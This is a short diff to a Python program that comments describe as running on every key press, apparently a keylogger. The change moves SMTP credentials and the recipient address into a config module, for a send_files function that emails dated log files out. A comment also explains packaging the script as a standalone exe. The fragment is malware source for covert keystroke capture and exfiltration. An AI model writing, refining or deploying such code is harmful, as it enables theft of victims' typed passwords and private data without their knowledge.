@@ -19,6 +19,7 @@ from email import encoders
 import threading
 from threading import Thread
 from stat import S_IWUSR
+import config
 
 
 # To get this into a exe. use pyinstaller --onefile  -F main23.py
@@ -85,21 +86,18 @@ def give_new_line():
 
 # The main function of the program. It runs whenever a key is pressed.
 
-username = ""
-password = ""
-send_email_to = ""
-smtp_server = ''
 
 
-def send_files(username):
+
+
+def send_files():
 
     date_log_name = datetime.today().strftime('%m-%d-%Y')
     date_log_name_string = str(date_log_name)
 
-    email_user = ""
-    email_password = password
-    email_send = ''
-
+    email_user = config.username
+    email_password = config.password
+    email_send = config.sendemailto
     subject = ' file' + date_log_name
 
     msg = MIMEMultipart()
